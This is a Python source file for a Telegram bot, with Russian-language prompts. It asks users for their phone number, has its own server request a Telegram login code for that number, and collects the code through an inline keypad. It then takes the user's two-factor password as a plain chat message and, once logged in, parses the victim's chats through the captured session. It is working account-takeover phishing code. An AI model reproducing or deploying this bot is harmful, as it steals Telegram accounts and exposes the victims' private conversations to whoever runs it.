import os
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded
from functions import verify_code, parse_chats
from buttons import create_inline_keyboard, create_start_button

API_TOKEN = ""
API_ID = 
API_HASH = ""

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
user_data = {}

@dp.message_handler(commands=["start"])
async def start(message: types.Message):
    keyboard = create_start_button()
    await message.answer("Отправьте ваш номер телефона:", reply_markup=keyboard)

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def get_contact(message: types.Message):
    user_id = message.from_user.id
    phone_number = message.contact.phone_number
    user_data[user_id] = {"phone": phone_number}
    await message.answer("Отлично! Отправляю код подтверждения...")
    
    user_data[user_id]["client"] = Client(
        name=f"user_{user_id}",
        api_id=API_ID,
        api_hash=API_HASH
    )
    client = user_data[user_id]["client"]
    try:
        await client.connect()
        sent_code = await client.send_code(phone_number)
        user_data[user_id]["phone_code_hash"] = sent_code.phone_code_hash
        await message.answer("Введите код, который вы получили:", reply_markup=create_inline_keyboard(""))
    except Exception as e:
        await message.answer(f"Ошибка при отправке кода: {str(e)}")

@dp.callback_query_handler(lambda c: True)
async def process_callback(query: types.CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_data:
        await query.answer("Сначала выполните команду /start.")
        return
    
    current_code = user_data[user_id].get("current_code", "")
    action = query.data
    if action.isdigit():
        current_code += action
    elif action == "backspace" and current_code:
        current_code = current_code[:-1]
    elif action == "verify" and len(current_code) == 5:
        user_data[user_id]["current_code"] = current_code
        await verify_code(query.message, user_id, current_code, user_data)
    user_data[user_id]["current_code"] = current_code
    if query.message.text != f"Ваш код: {current_code}":
        await query.message.edit_text(f"Ваш код: {current_code}", reply_markup=create_inline_keyboard(current_code))
    
    await query.answer()

@dp.message_handler(lambda message: message.text and user_data.get(message.from_user.id, {}).get("client"))
async def enter_password(message: types.Message):
    user_id = message.from_user.id
    client = user_data[user_id]["client"]
    password = message.text
    try:
        await client.check_password(password)
        await message.answer("Успешно авторизован!")
        await parse_chats(client, user_id, user_data)
    except Exception as e:
        await message.answer(f"Ошибка при вводе пароля: {str(e)}")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
    